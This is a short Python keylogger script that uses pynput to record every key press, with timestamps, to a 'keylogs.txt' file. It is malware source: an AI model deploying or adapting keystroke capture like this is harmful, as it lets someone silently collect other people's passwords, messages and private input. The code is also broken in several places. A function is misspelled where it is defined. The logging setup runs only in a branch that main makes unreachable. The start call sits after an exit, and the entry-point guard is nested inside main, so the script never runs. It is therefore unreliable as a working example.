import os 
import sys
import time 
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

def setup_loggin(log_dir):
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

        log_file = os.path.join(log_dir, "keylogs.txt")
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        pass # Igonore any errors during logging

def start_keylogger(log_dir):
    setup_logging(log_dir)

    with Listener(on_press=on_press) as listener:
        print ("Monitoring keyboard input. Press 'Ctrl+C' to stop.")
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Stopping keyboard monitoring.")
            sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("Usage: python keylogger.py <log_directory>")
        sys.exit(1)

    log_dir = sys.argv[1]

    if not os.path.isdir(log_dir):
        print("Tge specified log directory does not exist.")
        sys.exit(1)

        start_keylogger(log_dir)

    if __name__ == "__main__":
        main()